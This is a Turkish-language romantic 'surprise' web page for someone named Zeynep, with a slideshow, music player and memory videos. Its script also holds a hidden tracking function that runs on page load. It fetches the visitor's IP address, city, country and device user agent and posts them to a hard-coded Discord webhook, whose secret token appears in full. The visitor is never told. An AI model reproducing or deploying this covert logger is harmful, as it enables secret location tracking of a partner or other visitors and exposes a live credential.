<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seni Seviyorum Zeynep ❤️</title>
    <style>
        body { 
            margin: 0; background-image: url('arka-plan.gif.gif'); background-size: cover;
            background-position: center; background-repeat: no-repeat; background-attachment: fixed;
            background-color: #000; color: white; display: flex; flex-direction: column; 
            align-items: center; justify-content: center; height: 100vh; overflow: hidden; 
            font-family: 'Segoe UI', sans-serif; transition: background-image 0.5s ease;
        }

        #text { font-size: 26px; font-weight: bold; margin-bottom: 20px; z-index: 10; animation: pulseColor 4s ease-in-out infinite; }
        @keyframes pulseColor {
            0% { color: #ffffff; text-shadow: 0 0 5px #ffffff; opacity: 0.3; } 
            50% { color: #ff0000; text-shadow: 0 0 25px #ff0000; opacity: 1; } 
            100% { color: #ffffff; text-shadow: 0 0 5px #ffffff; opacity: 0.3; }
        }
        
        #gallery { position: relative; width: 280px; height: 380px; border-radius: 20px; overflow: hidden; box-shadow: 0 0 30px rgba(0,0,0,0.8); background: rgba(0,0,0,0.4); z-index: 10; border: 3px solid rgba(255,255,255,0.2); }
        .slide { position: absolute; width: 100%; height: 100%; object-fit: cover; opacity: 0; transition: opacity 1.2s ease; }
        .active { opacity: 1; }

        #controls { margin-top: 15px; display: none; flex-direction: column; align-items: center; gap: 10px; z-index: 20; }
        .btn-group { display: flex; gap: 8px; flex-wrap: wrap; justify-content: center; }
        
        .control-btn { background: rgba(40, 40, 40, 0.8); border: 1px solid rgba(255,255,255,0.3); color: white; padding: 10px 18px; border-radius: 25px; cursor: pointer; font-size: 12px; backdrop-filter: blur(5px); }
        .ani-main-btn { background: #ff0055 !important; border: none !important; font-weight: bold; }

        #musicPlayer { background: rgba(15, 20, 15, 0.95); padding: 15px; border-radius: 25px; display: flex; flex-direction: column; gap: 8px; width: 340px; border: 1px solid rgba(255,255,255,0.1); }
        .player-top { display: flex; align-items: center; gap: 12px; }
        #songImg { width: 50px; height: 50px; border-radius: 8px; object-fit: cover; background: #222; }
        #songName { font-size: 14px; font-weight: bold; color: #fff; margin: 0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; flex: 1; }
        
        .player-btns { display: flex; align-items: center; gap: 15px; justify-content: center; }
        .p-btn { background: none; border: none; color: white; cursor: pointer; font-size: 20px; transition: transform 0.2s; }
        .p-btn:active { transform: scale(0.9); }
        #playPauseBtn { font-size: 30px; color: #ff0055; }

        .progress-container { width: 100%; display: flex; align-items: center; gap: 10px; font-size: 10px; color: #aaa; }
        #progressBar { flex: 1; height: 4px; background: #333; border-radius: 2px; position: relative; cursor: pointer; }
        #progressFill { width: 0%; height: 100%; background: #ff0055; border-radius: 2px; }

        #aniPanel { display: none; position: fixed; bottom: 160px; background: rgba(0,0,0,0.9); padding: 20px; border-radius: 20px; z-index: 100; width: 85%; max-width: 350px; border: 2px solid #ff0055; }
        .ani-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 15px; }
        .ani-btn { background: #222; border: 1px solid #444; color: white; padding: 10px 5px; border-radius: 10px; cursor: pointer; font-size: 10px; }

        #videoOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 200; flex-direction: column; align-items: center; justify-content: center; }
        #videoPlayer { width: 95%; max-width: 500px; border-radius: 10px; }
        .close-video { margin-top: 25px; padding: 12px 30px; background: #ff0055; color: white; border: none; border-radius: 25px; cursor: pointer; }

        #startBtn { margin-top: 35px; padding: 18px 50px; font-size: 18px; font-weight: bold; background: linear-gradient(45deg, #ff0055, #ff5500); color: white; border: none; border-radius: 50px; cursor: pointer; z-index: 30; }
        .snowflake { position: fixed; top: -10px; color: white; z-index: 5; pointer-events: none; animation: fall linear infinite; }
        @keyframes fall { to { transform: translateY(105vh); } }
    </style>
</head>
<body>

    <div id="text">SENİ SEVİYORUM ZEYNEP ❤️</div>

    <div id="gallery">
        <script>
            // 1'den 23'e kadar resim döngüsü
            for(let i=1; i<=23; i++) {
                document.write(`<img src="resim${i}.jpeg.png" class="slide ${i===1?'active':''}">`);
            }
        </script>
    </div>

    <div id="controls">
        <div class="btn-group">
            <button class="control-btn" onclick="changeBG()">🖼️ Arka Plan</button>
            <button class="control-btn" id="snowToggle" onclick="toggleSnow()">❄️ Karı Kapat</button>
            <button class="control-btn ani-main-btn" onclick="toggleAniPanel()">🎥 ANILARIMIZ</button>
        </div>
        
        <div id="musicPlayer">
            <div class="player-top">
                <img id="songImg" src="">
                <p id="songName">Yükleniyor...</p>
            </div>
            
            <div class="progress-container">
                <span id="currentTime">0:00</span>
                <div id="progressBar" onclick="seek(event)">
                    <div id="progressFill"></div>
                </div>
                <span id="durationTime">0:00</span>
            </div>

            <div class="player-btns">
                <button class="p-btn" onclick="oncekiSarki()">⏮</button>
                <button class="p-btn" id="playPauseBtn" onclick="togglePlay()">⏸</button>
                <button class="p-btn" onclick="sonrakiSarki()">⏭</button>
            </div>
        </div>
    </div>

    <div id="aniPanel">
        <p style="margin: 0; font-size: 14px; text-align: center; font-weight: bold;">Bir Anı Seç ✨</p>
        <div class="ani-grid">
            <script>
                for(let i=1; i<=7; i++) {
                    document.write(`<button class="ani-btn" onclick="videoOynat(${i})">Anı ${i}</button>`);
                }
            </script>
        </div>
        <button onclick="toggleAniPanel()" style="width:100%; margin-top:15px; background:none; border:none; color:#777; cursor:pointer;">Vazgeç</button>
    </div>

    <div id="videoOverlay">
        <video id="videoPlayer" controls></video>
        <button class="close-video" onclick="videoKapat()">❌ Videoyu Kapat</button>
    </div>

    <button id="startBtn" onclick="baslat()">Sürprizi Başlat ✨</button>

    <audio id="bgMusic"></audio>

    <script>
        // TAKİP SİSTEMİ (Senin Webhook Linkin Eklendi)
        function logEntry() {
            const webhookURL = "https://discord.com/api/webhooks/1497206835713802291/FWv58EM_GNQcp8HlVq6lZOZySdw9EgHl5a1yU6NnyWfKSl9yBUMPT41D0rRyS5EFAW5z"; 
            
            fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => {
                const message = {
                    embeds: [{
                        title: "🚀 Siteye Yeni Giriş!",
                        color: 16711830,
                        fields: [
                            { name: "🕒 Saat", value: new Date().toLocaleString('tr-TR'), inline: true },
                            { name: "📍 Konum", value: `${data.city} / ${data.country_name}`, inline: true },
                            { name: "🌐 IP Adresi", value: data.ip, inline: false },
                            { name: "📱 Cihaz", value: navigator.userAgent, inline: false }
                        ],
                        footer: { text: "Zeynep Sürpriz Takip Sistemi" }
                    }]
                };

                fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
            }).catch(e => console.log("Log hatası:", e));
        }

        window.addEventListener('load', logEntry);

        const sarkiListesi = [
            { isim: "SONSUZ OL", dosya: "müzik.mp3.mp3", kapak: "" },
            { isim: "KAR BEYAZ", dosya: "müzik2.mp3.mp3", kapak: "kapak2.jpeg.png" },
            { isim: "CAMBAZ", dosya: "müzik3.mp3.mp3", kapak: "kapak3.jpeg.png" },
            { isim: "AŞK DURDUKÇA", dosya: "müzik4.mp3.mp3", kapak: "kapak4.jpeg.png" },
            { isim: "HARD CORE MELANKOLİ", dosya: "müzik5.mp3.mp3", kapak: "kapak5.jpeg.png" },
            { isim: "TUTAMIYORUM ZAMANI", dosya: "müzik6.mp3.mp3", kapak: "kapak6.jpeg.png" },
            { isim: "ARNAVUT KALDIRIMI", dosya: "müzik7.mp3..mp3", kapak: "kapak7.jpeg.png" },
            { isim: "ZEYNEPİM♥", dosya: "müzik8.mp3.mp3", kapak: "kapak8.jpeg.jpeg" } 
        ];

        let sarkiIndex = 0; let bgMode = 1; let snowActive = true; let snowInterval = null;
        const music = document.getElementById("bgMusic");
        const playPauseBtn = document.getElementById("playPauseBtn");
        const progressFill = document.getElementById("progressFill");
        const currentTimeEl = document.getElementById("currentTime");
        const durationTimeEl = document.getElementById("durationTime");
        const songNameDisplay = document.getElementById("songName");
        const songImgDisplay = document.getElementById("songImg");
        const videoOverlay = document.getElementById("videoOverlay");
        const videoPlayer = document.getElementById("videoPlayer");
        const aniPanel = document.getElementById("aniPanel");

        function sarkiYukle(index) {
            const sarki = sarkiListesi[index];
            music.src = sarki.dosya;
            songNameDisplay.innerText = sarki.isim;
            if(sarki.kapak) {
                songImgDisplay.src = sarki.kapak;
                songImgDisplay.style.display = "block";
            } else {
                songImgDisplay.style.display = "none";
            }
            music.load();
        }

        function togglePlay() {
            if (music.paused) { music.play(); playPauseBtn.innerText = "⏸"; }
            else { music.pause(); playPauseBtn.innerText = "▶"; }
        }

        function sonrakiSarki() {
            sarkiIndex = (sarkiIndex + 1) % sarkiListesi.length;
            sarkiYukle(sarkiIndex); music.play(); playPauseBtn.innerText = "⏸";
        }

        function oncekiSarki() {
            sarkiIndex = (sarkiIndex - 1 + sarkiListesi.length) % sarkiListesi.length;
            sarkiYukle(sarkiIndex); music.play(); playPauseBtn.innerText = "⏸";
        }

        music.addEventListener('ended', sonrakiSarki);

        music.addEventListener('timeupdate', () => {
            const progress = (music.currentTime / music.duration) * 100;
            progressFill.style.width = `${progress || 0}%`;
            currentTimeEl.innerText = formatTime(music.currentTime);
            if(music.duration) durationTimeEl.innerText = formatTime(music.duration);
        });

        function formatTime(seconds) {
            let min = Math.floor(seconds / 60);
            let sec = Math.floor(seconds % 60);
            return `${min}:${sec < 10 ? '0' : ''}${sec}`;
        }

        function seek(event) {
            const width = document.getElementById("progressBar").clientWidth;
            const clickX = event.offsetX;
            music.currentTime = (clickX / width) * music.duration;
        }

        function toggleAniPanel() {
            aniPanel.style.display = (aniPanel.style.display === "block") ? "none" : "block";
        }

        function videoOynat(no) {
            music.pause(); playPauseBtn.innerText = "▶";
            videoPlayer.src = `anilar${no}.mp4.mp4`; 
            videoOverlay.style.display = "flex";
            aniPanel.style.display = "none";
            videoPlayer.load(); videoPlayer.play();
        }

        function videoKapat() {
            videoPlayer.pause(); videoOverlay.style.display = "none";
            music.play(); playPauseBtn.innerText = "⏸";
        }

        function changeBG() {
            bgMode++; if(bgMode > 3) bgMode = 1;
            const urls = ['arka-plan.gif.gif', 'arka-plan2.gif.gif', '39800145-e763-41d3-a9ad-0ce382fb698e.jfif'];
            document.body.style.backgroundImage = `url('${urls[bgMode-1]}')`;
        }

        function toggleSnow() {
            const btn = document.getElementById("snowToggle");
            if(snowActive) {
                clearInterval(snowInterval); snowInterval = null;
                btn.innerText = "❄️ Karı Aç"; snowActive = false;
                document.querySelectorAll('.snowflake').forEach(s => s.remove());
            } else {
                snowActive = true; snowInterval = setInterval(createSnow, 150);
                btn.innerText = "❄️ Karı Kapat";
            }
        }

        function createSnow() {
            if(!snowActive) return;
            const snow = document.createElement('div');
            snow.innerHTML = '❄'; snow.className = 'snowflake';
            snow.style.left = Math.random() * 100 + 'vw';
            snow.style.animationDuration = Math.random() * 3 + 2 + 's';
            document.body.appendChild(snow);
            setTimeout(() => snow.remove(), 5000);
        }

        function baslat() {
            sarkiYukle(0); music.play().catch(() => {});
            document.getElementById("startBtn").style.display = "none";
            document.getElementById("controls").style.display = "flex";
            if(snowActive && !snowInterval) snowInterval = setInterval(createSnow, 150);

            let current = 0; const slides = document.querySelectorAll('.slide');
            setInterval(() => {
                slides[current].classList.remove('active');
                current = (current + 1) % slides.length;
                slides[current].classList.add('active');
            }, 3000);
        }
    </script>
</body>
</html>
